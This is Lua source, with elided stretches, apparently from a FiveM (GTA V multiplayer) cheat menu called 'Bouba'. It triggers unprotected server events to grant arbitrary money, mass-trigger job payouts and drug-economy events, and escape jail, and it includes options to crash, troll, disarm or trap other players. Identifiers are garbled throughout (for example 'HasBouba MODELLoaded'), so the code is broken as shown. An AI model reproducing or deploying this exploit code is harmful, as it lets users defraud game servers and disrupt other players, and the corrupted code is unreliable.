                    if Misc.MenuButton(dA.name, dA.id) then end elseif dA.id == "neon"
                    then
                    if Misc.MenuButton(dA.name, dA.id) then end elseif dA.id == "paint"
                    then
                    if Misc.MenuButton(dA.name, dA.id) then end elseif dA.id == "wheeltypes" 
                    then
                    if Misc.MenuButton(dA.name, dA.id) then end elseif dA.id == "headlight"
                    then
                    if Misc.MenuButton(dA.name, dA.id) then end
                    ...
                    if Misc.Button("Xenon Headlight", xenonStatus) then
                    ...
                    Misc.Display() 
                elseif Misc.IsMenuOpened("performance") then 
                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
                    for i, dA in pairs(be) do
                        if Misc.MenuButton(dA.name, dA.id) then 
                        end 
                    end
                    ...
                    if Misc.Button("Turbo Tune", turboStatus) then
                    ...
                    Misc.Display() elseif Misc.IsMenuOpened("primary") then Misc.MenuButton("~r~→  ~s~Classic", "classic1") Misc.MenuButton("~r~→  ~s~Metallic", "metallic1") Misc.MenuButton("~r~→  ~s~Matte", "matte1") Misc.MenuButton("~r~→  ~s~Metal", "metal1") Misc.Display() elseif Misc.IsMenuOpened("secondary") then Misc.MenuButton("~r~→  ~s~Classic", "classic2") Misc.MenuButton("~r~→  ~s~Metallic", "metallic2") Misc.MenuButton("~r~→  ~s~Matte", "matte2") Misc.MenuButton("~r~→  ~s~Metal", "metal2") Misc.Display() elseif Misc.IsMenuOpened("rimpaint") then Misc.MenuButton("~r~→  ~s~Classic", "classic3") Misc.MenuButton("~r~→  ~s~Metallic", "metallic3") Misc.MenuButton("~r~→  ~s~Matte", "matte3") Misc.MenuButton("~r~→  ~s~Metal", "metal3") Misc.Display() elseif Misc.IsMenuOpened("classic1") then
                    ...
                    end end; curprim, cursec = GetVehicleColours(veh) if Misc.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; Misc.Display() elseif Misc.IsMenuOpened("metallic1") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; Misc.Display() elseif Misc.IsMenuOpened("matte1") then
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; Misc.Display() elseif Misc.IsMenuOpened("metal1") then
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; Misc.Display() elseif Misc.IsMenuOpened("classic2") then
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; Misc.Display() elseif Misc.IsMenuOpened("matte2") then
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; Misc.Display() elseif Misc.IsMenuOpened("metal2") then
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; Misc.Display() elseif Misc.IsMenuOpened("matte3") then
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; Misc.Display() elseif Misc.IsMenuOpened("metal3") then
                    ...
                    Misc.Display()
            elseif Misc.IsMenuOpened("LSC") then
			local veh = GetVehiclePedIsUsing(PlayerPedId())
					if Misc.MenuButton('~r~→  ~s~~y~Handling ~s~editor', 'Hedit') then
		elseif Misc.MenuButton("~r~→  ~s~~g~Performance ~s~Tuning", "performance") then
        elseif Misc.MenuButton("~r~→  ~s~~b~Exterior ~s~Tuning", "tunings") then
                elseif Misc.CheckBox(
                    "Super Handling",
                    superGrip,
                    function(enabled)
                ...
                then
                elseif Misc.MenuButton("~r~→  ~s~Vehicle Boost", "VehBoostMenu") then
                elseif Misc.Button("Max Exterior Tuning") then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
                elseif Misc.Button("Max Performance") then
                    MaxOutPerf(GetVehiclePedIsUsing(PlayerPedId()))
                end

                Misc.Display()
		elseif Misc.IsMenuOpened("Hedit") then
		if GetVehiclePedIsIn( PlayerPedId(), false ) ~= 0 then
						if Misc.Button('Refresh Info') then
			...
			for i,theKey in pairs(chdata) do
				...
				if theKey.value and Misc.Button(theKey.name, theKey.value) then 
		...
		Misc.Display()
            elseif Misc.IsMenuOpened('CarTypes') then
                for i, ex in ipairs(b3) do
                    if Misc.MenuButton('~r~→  ~s~' .. ex, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                Misc.Display()
            elseif Misc.IsMenuOpened('CarTypeSelection') then
                for i, ex in ipairs(b4[carTypeIdx]) do
                    if Misc.MenuButton('~r~→  ~s~' .. ex, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                Misc.Display()
            elseif Misc.IsMenuOpened('CarOptions') then
                if Misc.Button('Spawn Infront Of You') then
                    ...
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasBouba MODELLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
				...
				elseif Misc.Button('Spawn In It') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b4[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
                ...
                Misc.Display()
            elseif Misc.IsMenuOpened('MainTrailer') then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                    for i, ex in ipairs(b5) do
                        if Misc.MenuButton('~r~→  ~s~' .. ex, 'MainTrailerSpa') then
                            TrailerToSpawn = i
                        end
                    end
                else
                ...
                Misc.Display()
            elseif Misc.IsMenuOpened('MainTrailerSpa') then
                if Misc.Button('Spawn Vehicle') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
            ...
            elseif Misc.IsMenuOpened("Bouba MaliciousMenu") then
				...
				elseif Misc.CheckBox(
					...
					then
				elseif Misc.Button("Time set to night") then
				NetworkOverrideClockTime(23, 50, 0)
				elseif Misc.Button("Time set to day") then
				NetworkOverrideClockTime(12, 12, 0)
				elseif Misc.Button("Wall-in Legion Square") then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e8 = -145066854
                    RequestBouba MODEL(e8)
                    while not HasBouba MODELLoaded(e8) do
                        Citizen.Wait(0)
                    end
                ...
                then
                elseif Misc.MenuButton('~r~→  ~s~ESP Menu', 'LulxDJ') then
				elseif Misc.CheckBox(
			...
			then
                ...
                Misc.Display()
			elseif Misc.IsMenuOpened('LulxDJ') then
                if
                    Misc.CheckBox(
                ...
                Misc.Display()
            elseif Misc.IsMenuOpened("Bouba ESXMenu") then
                if Misc.MenuButton("~r~→  ~s~ESX Money Options", "ESXMoneyMenu") then
                elseif Misc.MenuButton("~r~→  ~s~ESX Job Menu", "Bouba Bouba ESXJobMenu") then
                elseif Misc.MenuButton("~r~→  ~s~ESX Boss", "ESXBossMenu") then
                elseif Misc.MenuButton("~r~→  ~s~ESX Drugs", "ESXDrugMenu") then
                elseif Misc.MenuButton("~r~→  ~s~ESX Misc", "ESXMiscMenu") then
                end

                Misc.Display()
            elseif Misc.IsMenuOpened("ESXMiscMenu") then
                if Misc.Button("ESX Harvest FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startHarvest")
				elseif Misc.Button    ("ESX Get all licenses ") then
					TriggerServerEvent("dmv:success")
                ...
                elseif Misc.Button("ESX Craft FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startCraft")
                end

                Misc.Display()
            elseif Misc.IsMenuOpened("ESXDrugMenu") then
                if Misc.Button("Harvest Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                elseif Misc.Button("Transform Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                elseif Misc.Button("Sell Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                elseif Misc.Button("Harvest Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                elseif Misc.Button("Transform Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                elseif Misc.Button("Sell Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                elseif Misc.Button("Harvest Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                elseif Misc.Button("Transform Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                elseif Misc.Button("Sell Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                elseif Misc.Button("Harvest Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                elseif Misc.Button("Transform Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                elseif Misc.Button("Sell Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent ("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                elseif Misc.Button("Money Wash (x10)") then
                    ...
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                elseif Misc.Button("Stop all (Drugs)") then
...
-- 4x482
			...
			elseif Misc.Button("~g~Caution give back $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif Misc.Button("~g~Truckerjob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif Misc.Button("~g~Admin give bank $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif Misc.Button("~g~Admin give cash $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif Misc.Button("~g~Postal job $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif Misc.Button("~g~Bank security $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif Misc.Button("~g~Slotmachine $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif Misc.Button("~g~ LScustoms $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif Misc.Button("~g~Slotmachine(2) $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif Misc.Button("~g~Dirty money $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif Misc.Button("~g~Delivery $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif Misc.Button("~g~Taxijob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif Misc.Button("~g~Taxijob 10.000x $") then
				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
			elseif Misc.Button("~g~Pilot & Taxi (~g~ESX~s~) $") then
					...
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
			elseif Misc.Button("~g~Garbagejob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif Misc.Button("~g~Paycheck $") then
                ...
                Misc.Display()
            elseif Misc.IsMenuOpened("Bouba SelfMenu") then
			if Misc.MenuButton("~r~→  ~s~Ped Menu", "PedMenu") then
                                elseif Misc.Button("~g~Heal ~s~Yourself") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif Misc.Button("Get Some ~b~Armor") then
                    SetPedArmour(PlayerPedId(), 200)
				elseif Misc.Button("Go Invisible") then
				local Bouba MODEL2 = GetHashKey("mp_m_niko_01")
				local player2 = PlayerId()
				local playerPed = GetPlayerPed(-1)
				 RequestBouba MODEL(Bouba MODEL2)
     while not HasBouba MODELLoaded(Bouba MODEL2) do
        Wait(100)
    end

    SetPlayerBouba MODEL(player2, Bouba MODEL2)
    SetBouba MODELAsNoLongerNeeded(Bouba MODEL2)
					elseif Misc.Button("Go Visible Again") then
				local Bouba MODEL3 = GetHashKey("mp_m_freemode_01")
				local player3 = PlayerId()
				local playerPed = GetPlayerPed(-1)
				 RequestBouba MODEL(Bouba MODEL3)
     while not HasBouba MODELLoaded(Bouba MODEL3) do
        Wait(100)
    end

    SetPlayerBouba MODEL(player3, Bouba MODEL3)
		SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetBouba MODELAsNoLongerNeeded(Bouba MODEL3)
                elseif Misc.Button("~o~Food~s~ & ~b~Water ~s~100% (~g~ESX~s~)") then
                    TriggerEvent("esx_status:set", "hunger", 1000000)
                    TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif Misc.Button("Get Some $ ~g~(~g~ESX~s~)") then
				...
				elseif Misc.Button("Get some $ ~b~(VRP)") then
				...
				TriggerServerEvent('PayForRepairNow',-100000)
				drawNotification("~g~KA-CHING $$")
                elseif Misc.Button("Revive yourself (~g~ESX~s~)") then
                    TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent("ambulancier:selfRespawn")
				elseif Misc.Button("Open Jail Menu (~g~ESX~s~)") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
                elseif Misc.Button("Get Out Of Jail (~g~ESX~s~)") then
                ...
                Misc.Display()
			elseif Misc.IsMenuOpened("PedMenu") then
				if Misc.ComboBox("MalePed", peds2, currentPedd, selectedPedd, function(currentIndex, selectedIndex)
                    currentPedd = currentIndex
                    selectedPedd = selectedIndex
                end)
                then
				elseif Misc.ComboBox("FemalePed", peds3, currentPeddd, selectedPeddd, function(currentIndex, selectedIndex)
                    currentPeddd = currentIndex
                    selectedPeddd = selectedIndex
                end)
                then
				elseif Misc.ComboBox("AnimalPed", peds4, currentPedddd, selectedPedddd, function(currentIndex, selectedIndex)
                    currentPedddd = currentIndex
                    selectedPedddd = selectedIndex
                end)
                then
			elseif Misc.Button("Change To Selected ~b~Male") then
					Deer.Destroy()
		Wait(100)
				local Bouba MODEL1 = GetHashKey(peds2[selectedPedd])
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestBouba MODEL(Bouba MODEL1)
    while not HasBouba MODELLoaded(Bouba MODEL1) do
        Wait(100)
    end

    SetPlayerBouba MODEL(player1, Bouba MODEL1)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetBouba MODELAsNoLongerNeeded(Bouba MODEL1)
	elseif Misc.Button("Change To Selected ~p~Female") then
		Deer.Destroy()
		Wait(100)
				local Bouba MODEL5 = GetHashKey(peds3[selectedPeddd])
				local player5 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestBouba MODEL(Bouba MODEL5)
    while not HasBouba MODELLoaded(Bouba MODEL5) do
        Wait(100)
    end

    SetPlayerBouba MODEL(player5, Bouba MODEL5)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetBouba MODELAsNoLongerNeeded(Bouba MODEL5)
	elseif Misc.Button("Change To Selected ~y~Animal") then
			Deer.Destroy()
		Wait(100)
				local Bouba MODEL6 = GetHashKey(peds4[selectedPedddd])
				local player6 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestBouba MODEL(Bouba MODEL6)
    while not HasBouba MODELLoaded(Bouba MODEL6) do
        Wait(100)
    end

    SetPlayerBouba MODEL(player6, Bouba MODEL6)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetBouba MODELAsNoLongerNeeded(Bouba MODEL6)
		elseif Misc.Button("Spawn A ~y~Deer ~s~And Ride It") then
     Deer.Create()
	Citizen.Wait(150)
	 Deer.Ride()
				elseif Misc.Button("Change To FiveM Ped") then
						Deer.Destroy()
		Wait(100)
				local Bouba MODEL3 = GetHashKey("mp_m_freemode_01")
				local player3 = PlayerId()
    ...
    SetBouba MODELAsNoLongerNeeded(Bouba MODEL3)
	elseif Misc.Button("Change To ~y~Trevor") then
			Deer.Destroy()
		Wait(100)
				local Bouba MODEL13 = GetHashKey("player_two")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestBouba MODEL(Bouba MODEL13)
    while not HasBouba MODELLoaded(Bouba MODEL13) do
        Wait(100)
    end

    SetPlayerBouba MODEL(player1, Bouba MODEL13)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetBouba MODELAsNoLongerNeeded(Bouba MODEL1)
	elseif Misc.Button("Change To ~b~Michael") then
			Deer.Destroy()
		Wait(100)
				local Bouba MODEL12 = GetHashKey("player_zero")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestBouba MODEL(Bouba MODEL12)
    while not HasBouba MODELLoaded(Bouba MODEL12) do
        Wait(100)
    end

    SetPlayerBouba MODEL(player1, Bouba MODEL12)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetBouba MODELAsNoLongerNeeded(Bouba MODEL12)
	elseif Misc.Button("Change To ~g~Franklin") then
			Deer.Destroy()
		Wait(100)
				local Bouba MODEL11 = GetHashKey("player_one")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestBouba MODEL(Bouba MODEL11)
    while not HasBouba MODELLoaded(Bouba MODEL11) do
        Wait(100)
    end

    SetPlayerBouba MODEL(player1, Bouba MODEL11)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetBouba MODELAsNoLongerNeeded(Bouba MODEL11)
	elseif Misc.Button("Change To ~r~Alien") then
			Deer.Destroy()
		Wait(100)
				local Bouba MODEL121 = GetHashKey("s_m_m_movalien_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestBouba MODEL(Bouba MODEL121)
    while not HasBouba MODELLoaded(Bouba MODEL121) do
        Wait(100)
    end

    SetPlayerBouba MODEL(player1, Bouba MODEL121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetBouba MODELAsNoLongerNeeded(Bouba MODEL121)
	elseif Misc.Button("Change To ~h~Bigfoot") then
			Deer.Destroy()
		Wait(100)
				local Bouba MODEL122 = GetHashKey("ig_orleans")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestBouba MODEL(Bouba MODEL122)
    while not HasBouba MODELLoaded(Bouba MODEL122) do
        Wait(100)
    end

    SetPlayerBouba MODEL(player1, Bouba MODEL122)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetBouba MODELAsNoLongerNeeded(Bouba MODEL122)
	elseif Misc.Button("Change Clothes (~g~ESX~s~) (NOT TESTED)") then
    TriggerEvent('esx_skin:openSaveableMenu')
	end
	Misc.Display()
            elseif Misc.IsMenuOpened("Bouba OnlinePlayersMenu") then
                    for i = 0, 128 do
                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and Misc.MenuButton("~r~→  ~s~Name: "..GetPlayerName(i).." | ID: "..GetPlayerServerId(i).." | "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~Dead ~s~|" or "~g~Alive ~s~|"), "Bouba PlayerOptionsMenu") then
                            SelectedPlayer = i
                        end
                    end

                    Misc.Display()
                elseif Misc.IsMenuOpened("Bouba PlayerOptionsMenu") then
                    Misc.SetSubTitle("Bouba PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                    if Misc.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
                        SpectatePlayer(SelectedPlayer)
					elseif Misc.Button('~g~Heal ~s~Player') then
                ...
                elseif Misc.Button('~b~FULL Armour ~s~Player') then
                    ...
                    elseif Misc.Button("Teleport To Player") then
										drawNotification(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
					...
					elseif Misc.Button("~g~Give ~w~Money") then
                    ...
                    elseif Misc.Button("Crash Player") then
                        CrashPlayer(GetPlayerPed(SelectedPlayer))
                    elseif Misc.MenuButton("~r~→  ~s~Troll Options", "Bouba PlayerTrollMenu") then
                    elseif Misc.MenuButton("~r~→  ~s~ESX Options", "PlayerBouba ESXMenu") then
                    elseif Misc.MenuButton("~r~→  ~s~Choose weapon", "SingleWepPlayer") then
                    elseif Misc.Button("Give Ammo") then
                        for i = 1, #allWeapons do
                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
                        end
                    elseif Misc.Button("Give All Weapons") then
                        for i = 1, #allWeapons do
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, false)
                        end
                    elseif Misc.Button("Remove All Weapons") then
                        for i = 1, #allWeapons do
                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
                        end
                    elseif Misc.Button("Give Vehicle") then
                        local ped = GetPlayerPed(SelectedPlayer)
                        local Bouba MODELName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
                        ...
                        if Bouba MODELName and IsBouba MODELValid(Bouba MODELName) and IsBouba MODELAVehicle(Bouba MODELName) then
                            ...
                            local veh = CreateVehicle(GetHashKey(Bouba MODELName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
                            drawNotification("~g~Vehicle Given To Player!")
                        else
                            drawNotification("~r~Bouba MODEL is not valid!")
                        end
					elseif Misc.Button('Clone Car') then
                    ClonePedVeh()
					elseif Misc.Button('Spawn Following Asshat') then
                    Citizen.CreateThread(function()
                    asshat = true
                    ...
                    local v = nil
                    RequestBouba MODEL(veh)
                    RequestBouba MODEL('s_m_y_hwaycop_01')
                    while not HasBouba MODELLoaded(veh) and not HasBouba MODELLoaded('s_m_m_security_01') do
                        RequestBouba MODEL('s_m_y_hwaycop_01')
                        Citizen.Wait(0)
                        RequestBouba MODEL(veh)
                    end
                    if HasBouba MODELLoaded(veh) then
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            veh,
                        ...
                        if DoesEntityExist(v) then
                            ...
                            RequestBouba MODEL('s_m_y_hwaycop_01')
                            Citizen.Wait(50)
                            if HasBouba MODELLoaded('s_m_y_hwaycop_01') then
                                Citizen.Wait(50)
                    ...
                    elseif Misc.Button("Spawn Smoke On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    ...
                    Misc.Display()
                elseif Misc.IsMenuOpened("PlayerBouba ESXMenu") then
                    if Misc.MenuButton("~r~→  ~s~ESX Triggers", "PlayerESXTriggerMenu") then
                    elseif Misc.MenuButton("~r~→  ~s~ESX Jobs", "PlayerBouba Bouba ESXJobMenu") then
                    end

                    Misc.Display()
                elseif Misc.IsMenuOpened("PlayerESXTriggerMenu") then
                    if Misc.Button("ESX Revive") then
                    ...
                    DoScreenFadeIn(800)
